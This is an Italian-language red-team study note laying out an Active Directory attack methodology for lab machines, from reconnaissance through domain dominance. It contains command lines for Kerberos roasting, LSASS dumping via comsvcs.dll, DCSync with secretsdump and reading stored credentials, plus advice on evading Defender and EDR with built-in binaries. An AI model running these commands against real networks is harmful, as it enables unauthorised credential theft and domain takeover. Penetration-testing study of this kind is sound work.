---

tags:

- metodologia
- red-team
- active-directory
- kill-chain
- opsec
- cheatsheet created: 2026-05-20

---

# Red Team Methodology — Ambienti AD

## 1. La Kill Chain generica

Ogni attacco AD, indipendentemente dalla box o dall'organizzazione, segue sempre la stessa struttura ad alto livello. I passi cambiano in dettaglio, ma la sequenza è invariante.

```
RICOGNIZIONE
    ↓
ENUMERAZIONE ANONIMA
    ↓
INITIAL ACCESS (prime credenziali)
    ↓
ENUMERAZIONE AUTENTICATA (BloodHound + WinPEAS)
    ↓
PRIVILEGE ESCALATION (locale o dominio)
    ↓
LATERAL MOVEMENT
    ↓
CREDENTIAL DUMPING
    ↓
DOMAIN DOMINANCE (DA / DCSync)
    ↓
[PERSISTENCE — in real engagement]
```

> [!note] La lettura di questa sequenza Non è sempre lineare. Spesso si torna indietro — ad esempio: enumerazione autenticata → scopro path ACL → lateral movement → nuova enumerazione → credential dump. Il flow è **iterativo**, non una cascata.

---

## 2. Fase 1 — Ricognizione esterna

Cosa fai **prima ancora di toccare la macchina target**.

### Recon passiva (OSINT)

- Sito web aziendale → nomi dipendenti → username candidati
- LinkedIn → ruoli, tecnologie usate
- DNS pubblico, certificati SSL (crt.sh) → subdomain enumeration
- Job listing → "esperienza con CyberArk/Splunk/ecc." → rivela stack interno

### Recon attiva (nmap)

```bash
# Quick scan
sudo nmap -sC -sV -oA scan_iniziale IP

# Full port scan
sudo nmap -p- --min-rate 5000 IP

# Lettura del fingerprint AD:
# 88 (Kerberos) + 389 (LDAP) + 3268 (GC) = Domain Controller
# 5985 (WinRM) = accesso remoto disponibile se hai credenziali
# 445 (SMB) = share enumeration, relay attacks
# 443 con cert = spesso Exchange, ADCS, o web app
```

---

## 3. Fase 2 — Enumerazione anonima (null session)

Cosa puoi raccogliere **senza credenziali**.

```bash
# LDAP anonymous bind
ldapsearch -x -H ldap://IP -b "DC=dominio,DC=local"

# SMB null session
rpcclient -U "" -N IP
# Dentro: enumdomusers, enumdomgroups, querydominfo

# Enum automatica
enum4linux -a IP

# Lista share SMB
smbclient -L //IP -U "" -N
```

**Risultati realistici su DC moderno (RestrictAnonymous=1):**

- ✅ Domain SID
- ✅ Domain Name
- ❌ Utenti (SAMR bloccato)
- ❌ Gruppi
- ❌ Password policy

> [!warning] Non fermarti qui se non trovi nulla `RestrictAnonymous=1` è il default moderno. Null session vuota **non significa** che non ci sia nulla — significa solo che serve almeno un account per andare avanti.

---

## 4. Fase 3 — Initial Access (prime credenziali)

L'obiettivo è ottenere **qualsiasi** account valido, anche il più basso. Vettori comuni:

### Senza credenziali (unauthenticated)

|Tecnica|Prerequisito|Tool|
|---|---|---|
|**AS-REP Roasting**|Lista username + utente con `DONT_REQ_PREAUTH`|`impacket-GetNPUsers` + hashcat 18200|
|**Username enumeration**|Nomi da web/OSINT|`username-anarchy`|
|**Password spray**|Lista username + password comuni|`kerbrute`, `crackmapexec`|
|**Anonymous share**|Share pubblica con file interessanti|`smbclient`|
|**Web app**|Login form, default credentials|Manuale / Burp|
|**NTLM relay**|Network access + traffico NTLM|`Responder` + `ntlmrelayx`|

### Con credenziali (post initial access)

|Tecnica|Prerequisito|Tool|
|---|---|---|
|**Kerberoasting**|Qualsiasi account + utente con SPN|`impacket-GetUserSPNs` + hashcat 13100|
|**Password spray autenticato**|Account valido|`crackmapexec`|
|**LDAP dump**|Qualsiasi account|`ldapdomaindump`, `bloodhound-python`|

> [!tip] Appena hai credenziali → lancia BloodHound Non aspettare di avere una shell. Con le prime credenziali valide lanci subito `bloodhound-python` da Kali. Ti dà la mappa completa del dominio e i path di attacco disponibili da quell'account.

---

## 5. Fase 4 — Enumerazione autenticata

Con credenziali o shell, questo è il primo blocco di comandi da lanciare.

### Da shell (evil-winrm / meterpreter / cmd)

```powershell
# Chi sono
whoami
whoami /priv          # → vedi windows_priv_esc_checklist per lettura
whoami /groups

# Ambiente
hostname
systeminfo
net users
net localgroup administrators
ipconfig /all

# Stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
cmdkey /list

# History PowerShell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Da Kali (con credenziali, senza shell)

```bash
# BloodHound — sempre il primo
bloodhound-python -u USER -p 'PASS' \
    -d DOMINIO -dc DC_FQDN -ns DC_IP -c All

# LDAP dump
ldapdomaindump ldap://IP -u 'DOMINIO\USER' -p 'PASS'

# SMB share con credenziali
smbclient -L //IP -U 'USER%PASS'
smbmap -H IP -u USER -p PASS
```

---

## 6. Fase 5 — Privilege Escalation

Dopo l'enumerazione sai dove sei. I path principali:

### Locale (sulla singola macchina)

|Path|Indicatore|Tecnica|
|---|---|---|
|Token abuse|SeImpersonate o SeAssignPrimaryToken|Potato attacks → SYSTEM|
|SeBackupPrivilege|Backup Operators group|Dump SAM/SYSTEM hive|
|Service misconfiguration|Servizio con path scrivibile da te|DLL hijack / binary replacement|
|Unquoted service path|`wmic service get name,pathname`|Binary in path con spazi|
|Autologon registry|DefaultPassword in Winlogon|Credenziali in chiaro|
|Stored credentials|`cmdkey /list`|`runas /savecred`|

### Dominio (escalation verso DA)

|Path|Indicatore in BloodHound|Tecnica|
|---|---|---|
|DCSync rights|`GetChanges + GetChangesAll` su dominio|`secretsdump` → dump tutti gli hash|
|GenericAll/WriteDACL|Su utente/gruppo target|Forza reset password o aggiunta a gruppo|
|WriteOwner|Su utente target|Prendi ownership → modifica ACL|
|AddMember|Su gruppo privilegiato|Aggiungi te stesso|
|Kerberoast|SPN su account con password crackabile|`GetUserSPNs` + hashcat 13100|
|ASREPRoast|`DONT_REQ_PREAUTH`|`GetNPUsers` + hashcat 18200|
|ADCS misconfig|ESC1-ESC8|`certipy` → certificato → PKINIT → DA|
|Unconstrained Delegation|Computer con flag Unconstrained|TGT capture → impersonation|
|DNSAdmins|Membro di DNSAdmins|DLL injection in DNS service → SYSTEM|

---

## 7. Fase 6 — Lateral Movement

Con credenziali di un altro account o hash, come ci muovi.

|Tecnica|Cosa serve|Tool|
|---|---|---|
|**Pass-the-Hash (PtH)**|NT hash dell'utente|`evil-winrm -H`, `crackmapexec`, `psexec.py`|
|**Pass-the-Ticket (PtT)**|TGT o TGS Kerberos|`ticketer.py`, `psexec.py -k`|
|**OverPassTheHash**|NT hash → converti in TGT|`secretsdump` + `getTGT.py`|
|**evil-winrm**|Credenziali + WinRM aperto|`evil-winrm -i IP -u USER -p PASS`|
|**psexec / smbexec**|Admin credentials + SMB|`impacket-psexec`, `impacket-smbexec`|
|**wmiexec**|Admin credentials + WMI|`impacket-wmiexec`|
|**RDP**|Credenziali + porta 3389|`xfreerdp`|

> [!note] Distinzione PtH vs PtT
> 
> - **PtH** — usa NT hash, funziona con NTLM. Hashcat non necessario — l'hash è la chiave.
> - **PtT** — usa ticket Kerberos, funziona dove Kerberos è richiesto. Il ticket ha una scadenza (10 ore di default).
> - Su ambienti con NTLM disabilitato (hardened) → solo PtT funziona.

---

## 8. Fase 7 — Credential Dumping

|Target|Cosa ottieni|Tool|
|---|---|---|
|**LSASS** (processo)|Hash + ticket in memoria degli utenti loggati|mimikatz (Win vecchio), pypykatz (offline)|
|**SAM** (locale)|NT hash degli account locali|`reg save SAM` + `secretsdump -sam`|
|**NTDS.DIT** (DC)|Tutti gli hash del dominio|DCSync via `secretsdump`|
|**LSASS dump** (offline)|Hash + ticket senza toccare mimikatz|`comsvcs.dll MiniDump` + `pypykatz`|
|**LSA Secrets**|Service account passwords|`secretsdump`|
|**DPAPI**|Credenziali cifrate utente|`dpapi.py`, mimikatz `dpapi` module|

```bash
# DCSync (il metodo più pulito su DC)
impacket-secretsdump DOMINIO/USER:'PASS'@DC_IP

# LSASS dump offline (bypassa version mismatch mimikatz)
# Su WS01 come admin:
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID_LSASS> C:\Temp\lsass.dmp full
# Da Kali:
pypykatz lsa minidump lsass.dmp
```

---

## 9. OPSEC — automation vs LOLBin

La distinzione più importante tra CTF e engagement reale.

||Tool automatico (WinPEAS, SharpHound, mimikatz)|LOLBin manuale|
|---|---|---|
|**Velocità**|30 secondi|30 minuti|
|**Copertura**|Completa|Quello che sai cercare|
|**Defender**|Bloccato immediatamente|Non rilevato (built-in Windows)|
|**EDR**|Bloccato per behavior|Possibile alert su sequenze anomale|
|**Quando usarlo**|CTF, lab, AV disabilitato|Engagement reali|

### LOLBin equivalenti ai tool principali

|Tool|Equivalente LOLBin|
|---|---|
|WinPEAS — Winlogon check|`reg query "HKLM\...\Winlogon"`|
|WinPEAS — scheduled tasks|`schtasks /query /fo LIST /v`|
|WinPEAS — servizi|`sc query` + `wmic service get`|
|SharpHound — sessioni|`net session`, `query user /server:TARGET`|
|SharpHound — local admins|`net localgroup administrators \\TARGET`|
|mimikatz sekurlsa|`comsvcs.dll MiniDump` + `pypykatz` offline|

> [!warning] La regola operativa In un engagement reale: **conosci cosa fanno gli automation tool, replicali con LOLBin**. I tool automatici ti insegnano cosa cercare (valore CTF/lab), i LOLBin ti permettono di cercarlo senza essere rilevato (valore reale).
> 
> Su HTB le box retired sono allenamento ai **pattern**. Le box attive sono esercizio di **metodologia blind**.

---

## 10. Il mental model per ogni nuova box AD

```
1. NMAP
   → vedo 88 + 389 + 3268? → è un DC
   → vedo 5985? → WinRM disponibile, fine path
   → vedo 80/443? → sito web, cerca nomi/credenziali

2. ENUMERAZIONE ANONIMA
   → null session → prendo Domain SID se disponibile
   → sito web → nomi per username-anarchy

3. INITIAL ACCESS
   → AS-REP Roasting (no creds needed)
   → Kerberoasting (se ho un account)
   → Password spray
   → Web app / default creds

4. APPENA HO CREDENZIALI
   → bloodhound-python immediato
   → Guardo Outbound Object Control di ogni account trovato

5. SHELL
   → whoami /priv → lista GOLD/SILVER?
   → whoami /groups → gruppi privilegiati?
   → reg query Winlogon → stored creds?
   → BloodHound → path verso DA?

6. ESCALATION
   → Seguo il path che BloodHound o l'enumerazione ha indicato
```

---

## Takeaways

> [!abstract] I punti chiave
> 
> 1. **La sequenza è invariante**: recon → null session → initial access → enumerazione → escalation → lateral → DA. Il contenuto cambia, la struttura no
> 2. **BloodHound al primo account**: non aspettare di essere admin. Le prime credenziali aprono già tutta la visibilità
> 3. **"Noioso" è informazione**: whoami senza privilegi GOLD ti dice che quel path è chiuso → cerchi altrove
> 4. **Automation in lab, LOLBin in produzione**: capire cosa cercano i tool automatici è il prerequisito per replicarli manualmente
> 5. **Box retired = pattern learning, box attive = metodologia blind**: due cose diverse, entrambe necessarie

---

## Vedi anche

- [[windows_priv_esc_checklist]] — lettura dettagliata whoami /priv e /groups
- [[getnpusers_asrep_roasting]] — AS-REP Roasting in dettaglio
- [[impacket]] — toolkit per ogni fase
- [[ldap]] — enumerazione LDAP autenticata
- [[windows_enterprise_architecture]] — struttura AD
- [[ad_certificate_services]] — ESC1-ESC15, path ADCS
- [[htb_sauna]] — esempio concreto kill chain completa